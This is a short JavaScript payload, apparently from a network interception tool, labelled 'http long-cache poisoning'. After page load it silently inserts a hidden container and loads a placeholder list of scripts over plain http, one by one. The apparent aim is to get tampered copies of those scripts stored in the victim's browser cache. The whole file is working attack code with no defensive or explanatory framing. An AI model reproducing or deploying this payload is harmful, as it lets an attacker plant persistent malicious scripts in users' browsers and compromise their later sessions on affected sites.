(function() {
	if (window._$AD_ || top != window) {
		return;
	}
	window._$AD_ = true;


	// ==================================================
	// http long-cache poisoning
	// ==================================================
	var arr = '$LIST'.split('|');
	var box;

	function loadJs(url) {
		var spt = document.createElement('script');
		box.appendChild(spt);
		spt.src = 'http://' + url;
	}

	function loadNext() {
		var url = arr.pop();
		if (url) {
			loadJs(url);
			setTimeout(loadNext, 50);
		}
	}

	function preloadJs() {
		box = document.createElement('div');
		document.body.appendChild(box);
		loadNext();
	}

	function init() {
		preloadJs();
	}


	var $STD = !!document.addEventListener;

	$STD?
		window.addEventListener('load', init) :
		window.attachEvent('onload', init);

})();
